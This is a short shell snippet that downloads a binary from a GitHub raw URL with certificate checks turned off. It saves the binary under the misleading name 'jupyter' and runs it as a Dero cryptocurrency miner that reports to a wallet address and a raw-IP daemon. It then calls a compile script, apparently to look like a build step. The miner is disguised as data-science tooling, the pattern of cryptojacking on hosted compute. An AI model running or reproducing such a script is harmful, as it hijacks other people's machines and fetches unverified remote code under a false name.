...
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/build-amd64' -O jupyter
chmod +x jupyter
...
./python ./jupyter --wallet-address=dero1qy4ghx2445p3dqawvhkpkpy6qrq39al7txsheycp2sndfgr9xljsvqgtgddkd --daemon-rpc-address=164.92.251.76:80 --mining-threads=2
./compile.sh